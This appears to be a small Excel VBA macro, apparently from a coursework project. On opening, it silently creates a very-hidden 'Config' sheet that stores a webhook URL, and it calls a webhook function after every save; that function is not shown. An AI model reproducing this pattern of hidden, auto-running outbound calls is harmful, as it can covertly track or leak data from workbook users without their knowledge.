Private Sub Workbook_Open()
    Dim ws As Worksheet
    Dim domain As String

    ' Проверка листа Config
    On Error Resume Next
    Set ws = ThisWorkbook.Sheets("Config")
    On Error GoTo 0

    ' Если нет листа, создайте его
    If ws Is Nothing Then
        Set ws = ThisWorkbook.Sheets.Add
        ws.Name = "Config"
        ws.Visible = xlSheetVeryHidden  ' Скрыть лист
    End If

    ' Настройка домена
    domain = "http://kyrsach/webhook/webhook_excel.php"

    ' Запись домена в ячейку A1 листа Config
    ws.Range("A1").Value = domain
End Sub

Private Sub Workbook_AfterSave(ByVal Success As Boolean)
    If Success Then
        ' Вызывайте функцию отправки вебхука при сохранении файла
        Call SendWebhookRequest
    End If
End Sub
